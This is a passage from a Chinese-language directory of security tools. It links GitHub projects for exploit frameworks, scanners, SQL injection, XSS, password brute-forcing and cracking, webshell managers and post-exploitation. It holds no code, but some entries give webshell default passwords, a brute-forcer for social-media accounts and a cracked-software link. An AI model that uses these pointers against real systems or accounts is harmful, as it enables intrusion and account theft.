href="https://github.com/Fplyth0ner-Combie/Bug-Project-Framework">https://github.com/Fplyth0ner-Combie/Bug-Project-Framework</a> 易语言，模仿 msf 的漏洞利用框架，自带 exp 编辑器</p></li><li><p><a href="https://github.com/PowerScript/KatanaFramework">https://github.com/PowerScript/KatanaFramework</a> py，模仿 msf 的漏洞利用框架，还有些 ssh、压缩包破解工具</p></li><li><p><a href="https://github.com/m4ll0k/Galileo">https://github.com/m4ll0k/Galileo</a> py2，网站扫描器</p></li><li><p><a href="https://github.com/samhaxr/hackbox">https://github.com/samhaxr/hackbox</a> py2，simple，网站扫描器</p></li><li><p><a href="https://github.com/secrary/EllaScanner">https://github.com/secrary/EllaScanner</a> py3，simple，被动式漏洞扫描，支持历史 cve 编号漏洞识别</p></li><li><p><a href="https://github.com/m4ll0k/WAScan">https://github.com/m4ll0k/WAScan</a> py，simple，扫描页面/链接/脚本/Form, 测试 Payload 等</p></li><li><p><a href="https://github.com/jiangsir404/S7scan">https://github.com/jiangsir404/S7scan</a> py,已用 1，七种综合检测</p></li><li><p><a href="https://github.com/hatRiot/clusterd">https://github.com/hatRiot/clusterd</a> py，simple，web 漏洞利用</p></li><li><p><a href="https://github.com/M4cs/BabySploit">https://github.com/M4cs/BabySploit</a> py,simple,模仿 msf</p></li><li><p><a href="https://github.com/iceyhexman/onlinetools">https://github.com/iceyhexman/onlinetools</a> simple，web 界面，在线 cms 指纹识别|旁站|c 段|信息泄露|工控|系统|物联网安全|cms 漏洞扫描|端口扫描|等</p></li><li><p><a href="https://github.com/tulpar/tulpar">https://github.com/tulpar/tulpar</a> simple,支持多种 web 漏洞扫描</p></li><li><p><a href="https://github.com/UltimateHackers/Striker">https://github.com/UltimateHackers/Striker</a> simple，信息搜集、cms 利用与漏扫，侦察绕过 Cloudflare</p></li><li><p><a href="https://github.com/0x4D31/salt-scanner">https://github.com/0x4D31/salt-scanner</a> 基于 Salt Open 以及 Vulners Linux Audit API 的 linux 漏洞扫描器，支持与 JIRA、slack 平台结合使用</p></li><li><p><a href="https://github.com/opensec-cn/kunpeng">https://github.com/opensec-cn/kunpeng</a> go，POC 检测框架，以动态链接库的形式提供各种语言调用</p></li></ul><h2 id="运维安全服务与资产管理"><a href="#运维安全服务与资产管理" class="headerlink" title="运维安全服务与资产管理#"></a><strong>运维安全服务与资产管理</strong>#</h2><ul><li><p><a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a> CloudWalker（牧云）服务器安全管理平台，逐步覆盖服务器资产管理、威胁扫描、Webshell 查杀、基线检测等功能。</p></li><li><p><a href="https://github.com/mitre/caldera">https://github.com/mitre/caldera</a> mitre 公司模拟攻击测试系统，主要是在 win 下</p></li><li><p><a href="https://github.com/guardicore/monkey">https://github.com/guardicore/monkey</a> 评估网络安全状况，分为扫描器与 C2C 服务器，利用默认口令与 exp 对 ssh、smb 等多种协议方式进行攻击检测</p></li><li><p><a href="https://github.com/grayddq/PublicSecScan">https://github.com/grayddq/PublicSecScan</a> 调用 awvs 对大量 WEB 资产进行分布式 WEB 安全扫描，发现 web 环境下常规的一些安全漏洞</p></li><li><p><a href="https://github.com/jeffzh3ng/Fuxi-Scanner">https://github.com/jeffzh3ng/Fuxi-Scanner</a> 资产管理，漏洞检测集成 awvs、创宇 Pocsuite、nmap、hydra</p></li><li><p><a href="https://github.com/infobyte/faraday">https://github.com/infobyte/faraday</a> 协作渗透测试和漏洞管理平台，集成多种</p></li><li><p><a href="https://github.com/DefectDojo/django-DefectDojo">https://github.com/DefectDojo/django-DefectDojo</a> 基于 django 的漏洞资产管理平台</p></li><li><p><a href="https://github.com/creditease-sec/insight">https://github.com/creditease-sec/insight</a> web 界面，宜信安全部开发，集成应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的管理平台</p></li><li><p><a href="https://github.com/RASSec/A_Scan_Framework">https://github.com/RASSec/A_Scan_Framework</a> 漏洞管理、资产管理、任务扫描系统</p></li><li><p><a href="https://github.com/cea-sec/ivre">https://github.com/cea-sec/ivre</a> 网络资产指纹发现，搭建属于自己的 shodan 与 zoomeye</p></li><li><p><a href="https://github.com/ysrc/xunfeng">https://github.com/ysrc/xunfeng</a> web 界面，同程安全开发的网络资产识别引擎，漏洞检测引擎</p></li><li><p><a href="https://github.com/superhuahua/xunfengES">https://github.com/superhuahua/xunfengES</a> web 界面，base 巡风开发，一个人的安全</p></li><li><p><a href="https://github.com/zhaoweiho/SecurityManageFramwork">https://github.com/zhaoweiho/SecurityManageFramwork</a> py3，django。企业内网安全管理平台，包含资产管理，漏洞管理，账号管理，知识库管、安全扫描自动化功能模块</p></li><li><p><a href="https://github.com/grayddq/PublicMonitors">https://github.com/grayddq/PublicMonitors</a> 对公网 IP 列表进行端口服务扫描，发现周期内的端口服务变化情况和弱口令安全风险。一个人的安全部</p></li><li><p><a href="https://github.com/grayddq/PubilcAssetInfo">https://github.com/grayddq/PubilcAssetInfo</a> 主要目标是以甲方安全人员的视角，尽可能收集发现企业的域名和服务器公网 IP 资产。如百度云、阿里云、腾讯云等。一个人的安全部</p></li><li><p><a href="https://github.com/maya6/SiteScan">https://github.com/maya6/SiteScan</a> web 界面，py3 celery。资产收集</p></li><li><p><a href="https://github.com/ywolf/F-NAScan">https://github.com/ywolf/F-NAScan</a> py2.6，网络资产、端口服务搜集整理，生成报表显示。快速</p></li><li><p><a href="https://github.com/flipkart-incubator/RTA">https://github.com/flipkart-incubator/RTA</a> 扫描公司内部所有在线设备, 提供整体安全视图, 标示所有安全异常</p></li><li><p><a href="https://github.com/0xbug/Biu-framework">https://github.com/0xbug/Biu-framework</a> 企业内网基础服务安全扫描框架</p></li></ul><h2 id="上传漏洞利用"><a href="#上传漏洞利用" class="headerlink" title="上传漏洞利用#"></a><strong>上传漏洞利用</strong>#</h2><ul><li><p><a href="https://github.com/UltimateHackers/Arjun">https://github.com/UltimateHackers/Arjun</a> 扫描网页, 使用正则表达式爆破查找隐藏的 GET/POST 参数</p></li><li><p><a href="https://github.com/3xp10it/xupload">https://github.com/3xp10it/xupload</a> 用于自动测试上传功能是否可上传 webshell 的工具</p></li><li><p><a href="https://github.com/gunnerstahl/JQShell">https://github.com/gunnerstahl/JQShell</a> py3，CVE-2018-9206 jQuery File Upload 利用工具</p></li><li><p><a href="https://github.com/destine21/ZIPFileRaider">https://github.com/destine21/ZIPFileRaider</a> burp 插件，测试 zip 文件上传漏洞</p></li><li><p><a href="https://github.com/jpiechowka/zip-shotgun">https://github.com/jpiechowka/zip-shotgun</a> py，测试 zip 文件上传漏洞</p></li></ul><h2 id="端口发现服务指纹识别"><a href="#端口发现服务指纹识别" class="headerlink" title="端口发现服务指纹识别#"></a><strong>端口发现服务指纹识别</strong>#</h2><ul><li><p><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a> LUA,Nmap 端口扫描器，具有有强大的脚本引擎框架</p></li><li><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a> C,无状态扫描，可以调用 nmap 进行指纹识别</p></li><li><p><a href="https://github.com/zmap/zmap">https://github.com/zmap/zmap</a> C,无状态扫描，需要用 C 编写扩展模块</p></li><li><p><a href="https://github.com/zmap/zgrab">https://github.com/zmap/zgrab</a> go，基于 zmap 扫描器进行指纹识别、调度管理，可绕过 CDN</p></li><li><p><a href="https://github.com/chichou/grab.js">https://github.com/chichou/grab.js</a> 类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议</p></li><li><p><a href="https://github.com/johnnyxmas/scancannon">https://github.com/johnnyxmas/scancannon</a> shell,联动 masscan 和 nmap</p></li><li><p><a href="https://github.com/OffensivePython/Nscan">https://github.com/OffensivePython/Nscan</a> 基于 Masscan 和 Zmap 的网络扫描器</p></li><li><p><a href="https://github.com/ring04h/wyportmap">https://github.com/ring04h/wyportmap</a> 调用 nmap 目标端口扫描+系统服务指纹识别</p></li><li><p><a href="https://github.com/angryip/ipscan">https://github.com/angryip/ipscan</a> Angry IP Scanner，跨平台界面化端口扫描器</p></li><li><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a> WAF 产品指纹识别</p></li><li><p><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a> ssl 类型识别</p></li><li><p><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a> web 指纹识别</p></li><li><p><a href="https://github.com/Rvn0xsy/FastWhatWebSearch">https://github.com/Rvn0xsy/FastWhatWebSearch</a> whatweb 工具结果搜索平台</p></li><li><p><a href="https://github.com/tanjiti/FingerPrint">https://github.com/tanjiti/FingerPrint</a> web 应用指纹识别</p></li><li><p><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a> 网络爬虫式指纹识别</p></li><li><p><a href="https://github.com/ywolf/F-MiddlewareScan">https://github.com/ywolf/F-MiddlewareScan</a> 中间件扫描服务识别</p></li><li><p><a href="https://github.com/lietdai/doom">https://github.com/lietdai/doom</a> thorn 上实现的分布式任务分发的 ip 端口漏洞扫描器</p></li><li><p><a href="https://github.com/RASSec/RASscan">https://github.com/RASSec/RASscan</a> 端口服务扫描</p></li><li><p><a href="https://github.com/m3liot/shcheck">https://github.com/m3liot/shcheck</a> 用于检查 web 服务的 http header 的安全性</p></li><li><p><a href="https://github.com/mozilla/ssh_scan">https://github.com/mozilla/ssh_scan</a> 服务器 ssh 配置信息扫描</p></li><li><p><a href="https://github.com/18F/domain-scan">https://github.com/18F/domain-scan</a> 针对域名及其子域名的资产数据检测／扫描，包括 http/https 检测等</p></li><li><p><a href="https://github.com/ggusoft/inforfinder">https://github.com/ggusoft/inforfinder</a> 域名资产收集及指纹识别工具</p></li><li><p><a href="https://github.com/0xbug/Howl">https://github.com/0xbug/Howl</a> 网络设备 web 服务指纹扫描与检索</p></li><li><p><a href="https://github.com/mozilla/cipherscan">https://github.com/mozilla/cipherscan</a> 目标主机服务 ssl 类型识别</p></li><li><p><a href="https://github.com/medbenali/CyberScan">https://github.com/medbenali/CyberScan</a> 渗透测试辅助工具，支持分析数据包、解码、端口扫描、IP 地址分析等</p></li><li><p><a href="https://github.com/jekyc/wig">https://github.com/jekyc/wig</a> web 应用信息搜集工具</p></li><li><p><a href="https://github.com/eldraco/domain_analyzer">https://github.com/eldraco/domain_analyzer</a> 围绕 web 服务的域名进行信息收集和”域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等</p></li><li><p><a href="https://github.com/cloudtracer/paskto">https://github.com/cloudtracer/paskto</a> 基于 Nikto 扫描规则的被动式路径扫描以及信息爬虫</p></li><li><p><a href="https://github.com/zerokeeper/WebEye">https://github.com/zerokeeper/WebEye</a> 快速识别 WEB 服务器类型、CMS 类型、WAF 类型、WHOIS 信息、以及语言框架</p></li><li><p><a href="https://github.com/n4xh4ck5/CMSsc4n">https://github.com/n4xh4ck5/CMSsc4n</a> CMS 指纹识别</p></li><li><p><a href="https://github.com/HA71/WhatCMS">https://github.com/HA71/WhatCMS</a> CMS 检测和漏洞利用脚本, 基于 Whatcms.org API</p></li><li><p><a href="https://github.com/boy-hack/gwhatweb">https://github.com/boy-hack/gwhatweb</a> CMS 识别 python gevent 实现</p></li><li><p><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a> 基本算是 word press 下最好用的工具了</p></li><li><p><a href="https://github.com/swisskyrepo/Wordpresscan">https://github.com/swisskyrepo/Wordpresscan</a> 基于 WPScan 以及 WPSeku 的优化版 wordpress 扫描器</p></li><li><p><a href="https://github.com/m4ll0k/WPSeku">https://github.com/m4ll0k/WPSeku</a> 精简的 wordpress 扫描工具</p></li><li><p><a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> wordpress 漏洞利用框架</p></li><li><p><a href="https://github.com/Jamalc0m/wphunter">https://github.com/Jamalc0m/wphunter</a> php，wordpress 扫描器</p></li><li><p><a href="https://github.com/UltimateLabs/Zoom">https://github.com/UltimateLabs/Zoom</a> wordpress 漏洞扫描器</p></li><li><p><a href="https://github.com/immunIT/drupwn">https://github.com/immunIT/drupwn</a> Drupal 信息收集与漏洞利用工具</p></li><li><p><a href="https://github.com/CHYbeta/cmsPoc">https://github.com/CHYbeta/cmsPoc</a> CMS 渗透测试框架</p></li><li><p><a href="https://github.com/chuhades/CMS-Exploit-Framework">https://github.com/chuhades/CMS-Exploit-Framework</a> CMS 攻击框架</p></li><li><p><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> 20 多种 CMS 的基本检测，针对 wp 利用、可定制模块化爆破功能</p></li><li><p><a href="https://github.com/Dionach/CMSmap">https://github.com/Dionach/CMSmap</a> 支持 WordPress，Joomla 和 Drupal 扫描</p></li><li><p><a href="https://github.com/Moham3dRiahi/XAttacker">https://github.com/Moham3dRiahi/XAttacker</a> Web CMS Exploit 工具,包含针对主流 CMS 的 66 个不同的 Exploits</p></li><li><p><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a> 首款集成化的 Discuz 扫描工具</p></li></ul><h2 id="数据库扫描与爆破"><a href="#数据库扫描与爆破" class="headerlink" title="数据库扫描与爆破#"></a><strong>数据库扫描与爆破</strong>#</h2><ul><li><p><a href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a> Java 编写的 SQL 注入工具</p></li><li><p><a href="https://github.com/shack2/SuperSQLInjectionV1">https://github.com/shack2/SuperSQLInjectionV1</a> 安恒航牛的一款界面化注入工具</p></li><li><p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a> sql 注入 sqlmap</p></li><li><p><a href="https://github.com/stamparm/DSSS">https://github.com/stamparm/DSSS</a> 已用 1,99 行代码实现的 sql 注入漏洞扫描器</p></li><li><p><a href="https://github.com/Hadesy2k/sqliv">https://github.com/Hadesy2k/sqliv</a> 已用 1,基于搜索引擎的批量 SQL 注入漏洞扫描器</p></li><li><p><a href="https://github.com/quentinhardy/odat">https://github.com/quentinhardy/odat</a> 一款专门用于 Oracle 渗透的很全面的工具</p></li><li><p><a href="https://github.com/m8r0wn/enumdb">https://github.com/m8r0wn/enumdb</a> MySQL 和 MSSQL 利用工具后期爆破、搜索数据库并提取敏感信息。</p></li><li><p><a href="https://github.com/LoRexxar/Feigong">https://github.com/LoRexxar/Feigong</a> 针对各种情况自由变化的 MySQL 注入脚本</p></li><li><p><a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a> 一款针对 mongoDB 的攻击工具</p></li><li><p><a href="https://github.com/Neohapsis/bbqsql">https://github.com/Neohapsis/bbqsql</a> SQL 盲注利用框架</p></li><li><p><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a> 基于 Powershell 的 sqlserver 测试框架</p></li><li><p><a href="http://www.4hou.com/system/14950.html">http://www.4hou.com/system/14950.html</a> 利用 PowerUpSQL，渗透测试技巧：绕过 SQL Server 登录触发器限制</p></li><li><p><a href="https://github.com/WhitewidowScanner/whitewidow">https://github.com/WhitewidowScanner/whitewidow</a> 一款数据库扫描器</p></li><li><p><a href="https://github.com/stampery/mongoaudit">https://github.com/stampery/mongoaudit</a> MongoDB 审计及渗透工具</p></li><li><p><a href="https://github.com/torque59/Nosql-Exploitation-Framework">https://github.com/torque59/Nosql-Exploitation-Framework</a> NoSQL 扫描/爆破工具</p></li><li><p><a href="https://github.com/missDronio/blindy">https://github.com/missDronio/blindy</a> MySQL 盲注爆破工具</p></li><li><p><a href="https://github.com/JohnTroony/Blisqy">https://github.com/JohnTroony/Blisqy</a> 用于 http header 中的时间盲注爆破工具，仅针对 MySQL/MariaDB</p></li><li><p><a href="https://github.com/se55i0n/DBScanner">https://github.com/se55i0n/DBScanner</a> 自动扫描内网中常见 sql、no-sql 数据库脚本，包含未授权访问及常规弱口令检测</p></li><li><p><a href="https://github.com/Turr0n/firebase">https://github.com/Turr0n/firebase</a> 对没有正确配置的 firebase 数据库进行利用</p></li></ul><h2 id="XSS-跨站脚本检测利用"><a href="#XSS-跨站脚本检测利用" class="headerlink" title="XSS 跨站脚本检测利用#"></a><strong>XSS 跨站脚本检测利用</strong>#</h2><ul><li><p><a href="https://github.com/UltimateHackers/AwesomeXSS">https://github.com/UltimateHackers/AwesomeXSS</a> XSS Awesome 系列</p></li><li><p><a href="http://www.xss-payloads.com/">http://www.xss-payloads.com</a> 很全面的 xss 工具包与资料</p></li><li><p><a href="https://github.com/ismailtasdelen/xss-payload-list">https://github.com/ismailtasdelen/xss-payload-list</a> XSS 漏洞 Payload 列表</p></li><li><p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a> 经典的 xss 利用框架</p></li><li><p><a href="https://github.com/samdenty99/injectify">https://github.com/samdenty99/injectify</a> 类似 beef 的 xss 利用框架</p></li><li><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a> 蓝莲花战队为 CTF 打造的 xss 利用框架</p></li><li><p><a href="https://github.com/NytroRST/XSSFuzzer">https://github.com/NytroRST/XSSFuzzer</a> 根据特定标签生成 xss payload</p></li><li><p><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a> 余弦写的 xss 利用辅助工具</p></li><li><p><a href="https://github.com/UltimateHackers/XSStrike">https://github.com/UltimateHackers/XSStrike</a> 可识别并绕过 WAF 的 XSS 扫描工具</p></li><li><p><a href="https://github.com/raz-varren/xsshell">https://github.com/raz-varren/xsshell</a> go,利用 xss 漏洞返回一个 js 交互 shell</p></li><li><p><a href="https://github.com/UltimateHackers/JShell">https://github.com/UltimateHackers/JShell</a> 利用 xss 漏洞返回一个 js 交互 shell</p></li><li><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a> 一款 XSS 扫描器,可暴力注入参数</p></li><li><p><a href="https://github.com/1N3/XSSTracer">https://github.com/1N3/XSSTracer</a> 小型 XSS 扫描器,也可检测 CRLF、XSS、点击劫持的</p></li><li><p><a href="https://github.com/0x584A/fuzzXssPHP">https://github.com/0x584A/fuzzXssPHP</a> PHP 版本的反射型 xss 扫描</p></li><li><p><a href="https://github.com/chuhades/xss_scan">https://github.com/chuhades/xss_scan</a> 批量扫描 XSS 的 python 脚本</p></li><li><p><a href="https://github.com/BlackHole1/autoFindXssAndCsrf">https://github.com/BlackHole1/autoFindXssAndCsrf</a> 自动化检测页面是否存在 XSS 和 CSRF 漏洞的浏览器插件</p></li><li><p><a href="https://github.com/shogunlab/shuriken">https://github.com/shogunlab/shuriken</a> 使用命令行进行 XSS 批量检测</p></li><li><p><a href="https://github.com/stamparm/DSXS">https://github.com/stamparm/DSXS</a> 支持 GET、POST 方式的高效 XSS 扫描器</p></li><li><p><a href="https://github.com/bsmali4/xssfork">https://github.com/bsmali4/xssfork</a> kali 下无法使用的话，请下载正确的 PhantomJS 到目录 thirdparty/phantomjs/Linux</p></li><li><p><a href="https://github.com/riusksk/FlashScanner">https://github.com/riusksk/FlashScanner</a> flash xss 扫描</p></li><li><p><a href="https://github.com/Damian89/xssfinder">https://github.com/Damian89/xssfinder</a> 针对检测网站中的反射 XSS</p></li><li><p><a href="https://github.com/BlackHole1/WebRtcXSS">https://github.com/BlackHole1/WebRtcXSS</a> 自动化利用 XSS 入侵内网</p></li></ul><h2 id="弱口令扫描爆破"><a href="#弱口令扫描爆破" class="headerlink" title="弱口令扫描爆破#"></a><strong>弱口令扫描爆破</strong>#</h2><ul><li><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a> 支持多种协议方式的破解与爆破，v8 以后就不提供 windows 版本了</p></li><li><p><a href="https://github.com/nmap/ncrack">https://github.com/nmap/ncrack</a> c，支持多种协议的破解与爆破</p></li><li><p><a href="https://github.com/0pn1i9ht/F-Scrack">https://github.com/0pn1i9ht/F-Scrack</a> ysrc 对各类服务用户名密码爆破的脚本</p></li><li><p><a href="https://github.com/TunisianEagles/SocialBox">https://github.com/TunisianEagles/SocialBox</a> 针对 fb、gmail、ins、twitter 的用户名密码爆破的脚本</p></li><li><p><a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a> 支持多种协议的爆破，采用模块化设计，使用灵活</p></li><li><p><a href="https://github.com/m4ll0k/SMBrute">https://github.com/m4ll0k/SMBrute</a> 利用 smb 服务进行用户名密码爆破</p></li><li><p><a href="https://github.com/netxfly/crack_ssh">https://github.com/netxfly/crack_ssh</a> Go 写的协程版的 ssh\redis\mongodb 弱口令破解</p></li><li><p><a href="https://github.com/UltimateHackers/Blazy">https://github.com/UltimateHackers/Blazy</a> 支持测试 CSRF, Clickjacking, Cloudflare and WAF 的弱口令探测器</p></li><li><p><a href="https://github.com/Moham3dRiahi/XBruteForcer">https://github.com/Moham3dRiahi/XBruteForcer</a> WordPress、Joomla、DruPal、OpenCart、Magento 等 CMS 用户密码爆破</p></li><li><p><a href="https://github.com/shengqi158/weak_password_detect">https://github.com/shengqi158/weak_password_detect</a> Linux 下利用 nmap 多线程探测 ssh 弱口令</p></li><li><p><a href="https://github.com/ztgrace/changeme">https://github.com/ztgrace/changeme</a> 弱口令扫描器，不仅支持普通登录页，也支持 ssh、mongodb 等组件</p></li><li><p><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a> simple，http 暴力破解、撞库攻击脚本</p></li><li><p><a href="https://github.com/scu-igroup/ssh-scanner">https://github.com/scu-igroup/ssh-scanner</a> 联动 nmap、hydra 对 ssh 批量爆破</p></li></ul><h2 id="密码破解还原"><a href="#密码破解还原" class="headerlink" title="密码破解还原#"></a><strong>密码破解还原</strong>#</h2><ul><li><p><a href="https://securityxploded.com/download.php">https://securityxploded.com/download.php</a> 各种密码方向安全小工具</p></li><li><p><a href="https://github.com/bdutro/ibm_pw_clear">https://github.com/bdutro/ibm_pw_clear</a> IBM x3550/x3560 M3 bios 密码清除重置工具</p></li><li><p><a href="https://github.com/thehappydinoa/iOSRestrictionBruteForce">https://github.com/thehappydinoa/iOSRestrictionBruteForce</a> py,实现的 ios 访问限制密码破解工具</p></li><li><p><a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a> C,哈希破解</p></li><li><p><a href="https://github.com/fireeye/gocrack">https://github.com/fireeye/gocrack</a> GO,基于 hashcat 3.6.0+的分布式密码破解工具</p></li><li><p><a href="https://github.com/s3inlc/hashtopolis">https://github.com/s3inlc/hashtopolis</a> 基于 php 的 hashcat 的分布式破解工具，支持 C#与 python 客户端</p></li><li><p><a href="https://github.com/e-ago/bitcracker">https://github.com/e-ago/bitcracker</a> 首款开源的 BitLocker 密码破解工具</p></li><li><p><a href="https://www.ru.nl/publish/pages/909282/draft-paper.pdf">https://www.ru.nl/publish/pages/909282/draft-paper.pdf</a> 破解 SSD 下使用 BitLocker 的论文</p></li><li><p><a href="https://github.com/magnumripper/JohnTheRipper">https://github.com/magnumripper/JohnTheRipper</a> 已知密文的情况下尝试破解出明文的破解密码软件</p></li><li><p><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a> JohnTheRipper 密码破解的 GUI 界面，理论兼容所有功能，有 windows 界面</p></li><li><p><a href="https://github.com/jmk-foofus/medusa">https://github.com/jmk-foofus/medusa</a> 支持的协议会比 hydra 少一点，但是某些速度会快</p></li><li><p><a href="https://github.com/MrSqar-Ye/wpCrack">https://github.com/MrSqar-Ye/wpCrack</a> wordpress hash 破解</p></li><li><p><a href="https://github.com/testsecer/Md5Decrypt">https://github.com/testsecer/Md5Decrypt</a> C#,基于网上 web API 的 MD5 搜索工具</p></li><li><p><a href="https://github.com/s0md3v/Hash-Buster">https://github.com/s0md3v/Hash-Buster</a> 能调用多个 API 进行 hash 破解查询的智能工具</p></li><li><p><a href="https://www.52pojie.cn/thread-275945-1-1.html">https://www.52pojie.cn/thread-275945-1-1.html</a> ARCHPR Pro4.54 绿色中文破解版。压缩包密码破解，利用“已知明文攻击”破解加密的压缩文件</p></li></ul><h2 id="网站管理与-Webshell"><a href="#网站管理与-Webshell" class="headerlink" title="网站管理与 Webshell#"></a><strong>网站管理与 Webshell</strong>#</h2><ul><li><p><a href="http://www.bt.cn/">http://www.bt.cn</a> 宝塔网站管理系统</p></li><li><p><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a> js,中国蚁剑,插件式开发</p></li><li><p><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a> java，中国菜刀</p></li><li><p><a href="https://github.com/naozibuhao/SecQuanCknife">https://github.com/naozibuhao/SecQuanCknife</a> java，中国菜刀升级版，增加爆破功能</p></li><li><p><a href="https://github.com/euphrat1ca/hatchet">https://github.com/euphrat1ca/hatchet</a> 中国大砍刀</p></li><li><p><a href="https://github.com/tengzhangchao/PyCmd">https://github.com/tengzhangchao/PyCmd</a> py，一句话木马客户端程序，目前支持 php、jsp，CS 端通信加密</p></li><li><p><a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a> py,利用特定的一句话脚本对网站进行管理</p></li><li><p><a href="https://github.com/nil0x42/phpsploit">https://github.com/nil0x42/phpsploit</a> py3,利用特定的一句话脚本对网站进行管理</p></li><li><p><a href="https://github.com/wonderqs/Blade">https://github.com/wonderqs/Blade</a> py，利用特定的一句话脚本对网站进行管理</p></li><li><p><a href="https://github.com/anestisb/WeBaCoo">https://github.com/anestisb/WeBaCoo</a> perl，利用特定的一句话脚本对网站进行管理</p></li><li><p><a href="https://github.com/keepwn/Altman">https://github.com/keepwn/Altman</a> .net 配合 mono，实现的跨平台菜刀</p></li><li><p><a href="https://github.com/k4mpr3t/b4tm4n">https://github.com/k4mpr3t/b4tm4n</a> 集成伪造邮件 ddos，bat.php 的 webshell，初始 k4mpr3t</p></li><li><p><a href="https://github.com/dotcppfile/DAws">https://github.com/dotcppfile/DAws</a> 过防火墙 webshell，post pass=DAws</p></li><li><p><a href="https://github.com/b374k/b374k">https://github.com/b374k/b374k</a> php 网站管理，默认密码 b374k</p></li><li><p><a href="https://github.com/wso-shell/WSO">https://github.com/wso-shell/WSO</a> webshell 的文件管理，可以伪装为 404 界面</p></li><li><p><a href="https://github.com/UltimateHackers/nano">https://github.com/UltimateHackers/nano</a> php 小马，附带 py 编写的生成器</p></li><li><p><a href="https://github.com/rebeyond/memShell">https://github.com/rebeyond/memShell</a> 一款可以写入 java web server 内存中的 webshell</p></li><li><p><a href="https://github.com/DXkite/freebuf-stream-shell">https://github.com/DXkite/freebuf-stream-shell</a> PHP 使用流包装器实现 WebShell。freebuf 上有详细文章</p></li><li><p><a href="https://xz.aliyun.com/t/2799">https://xz.aliyun.com/t/2799</a> 利用动态二进制加密实现新型一句话木马之客户端篇</p></li><li><p><a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a> “冰蝎”动态二进制加密网站管理客户端</p></li><li><p><a href="https://xz.aliyun.com/t/2744#toc-8">https://xz.aliyun.com/t/2744#toc-8</a> 利用动态二进制加密实现新型一句话木马之 Java 篇</p></li><li><p><a href="https://xz.aliyun.com/t/2758#toc-4">https://xz.aliyun.com/t/2758#toc-4</a> 利用动态二进制加密实现新型一句话木马之.NET 篇</p></li><li><p><a href="https://xz.aliyun.com/t/2774#toc-4">https://xz.aliyun.com/t/2774#toc-4</a> 利用动态二进制加密实现新型一句话木马之 PHP 篇</p></li></ul><h2 id="内网拓展后渗透"><a href="#内网拓展后渗透" class="headerlink" title="内网拓展后渗透#"></a><strong>内网拓展后渗透</strong>#</h2><ul><li><p><a href="https://github.com/OpenWireSec/metasploit">https://github.com/OpenWireSec/metasploit</a> 后渗透框架</p></li><li><p><a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a> 基于 poweshell 的命令执行框架</p></li><li><p><a href="https://github.com/TheSecondSun/Bashark">https://github.com/TheSecondSun/Bashark</a> 纯 Bash 脚本编写的后渗透框架，大鲨鱼</p></li><li><p><a href="https://github.com/JusticeRage/FFM">https://github.com/JusticeRage/FFM</a> py3，拥有下载、上传功能，生成可执行 py 脚本的后门的后渗透框架</p></li><li><p><a href="https://github.com/DarkSpiritz/DarkSpiritz">https://github.com/DarkSpiritz/DarkSpiritz</a> py2,后渗透框架</p></li><li><p><a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a> 网络测试中的瑞士军刀，包含 impacket、PowerSploit 等多种模块</p></li><li><p><a href="https://github.com/SpiderLabs/scavenger">https://github.com/SpiderLabs/scavenger</a> 对 CrackMapExec 进行二次包装开发进行内网敏感信息扫描</p></li><li><p><a href="https://github.com/jmortega/python-pentesting">https://github.com/jmortega/python-pentesting</a> python-pentesting-tool python 安全工具相关功能模块</p></li><li><p><a href="https://github.com/0xdea/tactical-exploitation">https://github.com/0xdea/tactical-exploitation</a> Python/PowerShell 的测试脚本集</p></li><li><p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a> powershell 测试脚本集与开发框架汇总</p></li><li><p><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> powershell 脚本集与利用框架</p></li><li><p><a href="https://github.com/PowerShellEmpire/PowerTools">https://github.com/PowerShellEmpire/PowerTools</a> PowerShell 脚本集，停止更新</p></li><li><p><a href="https://github.com/FuzzySecurity/PowerShell-Suite">https://github.com/FuzzySecurity/PowerShell-Suite</a> PowerShell 脚本集</p></li><li><p><a href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts">https://github.com/rvrsh3ll/Misc-Powershell-Scripts</a> PowerShell 脚本集</p></li><li><p><a 